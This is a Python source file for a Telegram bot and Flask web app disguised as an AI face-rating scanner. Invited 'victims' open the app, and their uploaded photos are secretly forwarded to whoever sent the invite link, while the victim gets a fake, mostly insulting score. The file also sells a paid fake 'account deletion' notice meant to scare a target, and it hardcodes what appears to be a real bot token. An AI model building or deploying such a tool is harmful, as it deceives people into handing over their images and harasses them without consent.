import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, LabeledPrice, WebAppInfo
from flask import Flask, request, send_file
from threading import Thread
import random
import os

# ТОКЕН БОТА
TELEGRAM_TOKEN = "9037182564:AAF8t7WjlmrdSWmNsQV0nWxDkZM8LK-CwDc"
bot = telebot.TeleBot(TELEGRAM_TOKEN)

victims = {}
app = Flask(__name__)

# 1. ЭТА ФУНКЦИЯ ПОКАЗЫВАЕТ САЙТ, КОГДА ОН ОТКРЫВАЕТСЯ
@app.route('/')
def index():
    return send_file('index.html')

# 2. ЭТА ФУНКЦИЯ ПРИНИМАЕТ ФОТО С САЙТА
@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' not in request.files:
        return "Нет фото", 400
    
    photo = request.files['photo']
    user_id = int(request.form.get('user_id'))
    
    filename = f"temp_{user_id}.jpg"
    photo.save(filename)
    
    inviter_id = victims.get(user_id)
    
    if inviter_id:
        with open(filename, 'rb') as f:
            bot.send_photo(inviter_id, f, caption=f"📸 **Жертва попалась через сайт!**")
    
    ratings = ["SUB 5 😭", "SUB 5 😭", "SUB 5 😭", "NPC 😐", "CHAD 🗿"]
    result = random.choice(ratings)
    
    os.remove(filename)
    return result

# --- ЛОГИКА БОТА ---
@bot.message_handler(commands=['start'])
def start_message(message):
    command_parts = message.text.split()
    
    if len(command_parts) > 1:
        try:
            inviter_id = int(command_parts[1])
            victims[message.from_user.id] = inviter_id
            
            # ВСТАВЬ СЮДА СВОЮ ССЫЛКУ С RENDER (например, https://face-bot-xxxx.onrender.com)
            web_app_url = "https://face-bot-1-p8zh.onrender.com" 
            
            text = "🤖 **Добро пожаловать в Face Rate AI!**\n\nНажми на кнопку ниже, чтобы открыть приложение и пройти анализ."
            markup = InlineKeyboardMarkup()
            btn = InlineKeyboardButton("🚀 Открыть сканер", web_app=WebAppInfo(url=web_app_url))
            markup.add(btn)
            
            bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
        except ValueError:
            pass
    else:
        bot_info = bot.get_me()
        invite_link = f"https://t.me/{bot_info.username}?start={message.from_user.id}"
        text = "😎 **Ты в режиме создателя!**\n\nСкинь эту ссылку другу."
        markup = InlineKeyboardMarkup()
        btn = InlineKeyboardButton("📋 Скопировать ссылку", copy_text=telebot.types.CopyTextButton(text=invite_link))
        markup.add(btn)
        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(commands=['buy'])
def buy_prank(message):
    bot.send_invoice(message.chat.id, title="Пранк: Снос", description="Уведомление о сносе аккаунта.", invoice_payload="ban_prank_20", provider_token="", currency="XTR", prices=[LabeledPrice(label="Пранк-Снос", amount=20)])

@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
def got_payment(message):
    bot_info = bot.get_me()
    ban_link = f"https://t.me/{bot_info.username}?start=ban_prank"
    bot.send_message(message.chat.id, f"💸 **Оплата прошла!**\n\nВот ссылка: {ban_link}", parse_mode="Markdown")

# --- ЗАПУСК ---
def run_flask():
    # Render сам подставит нужный порт
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    t = Thread(target=run_flask)
    t.start()
    print("Face Rate Web App запущен!")
    bot.infinity_polling()
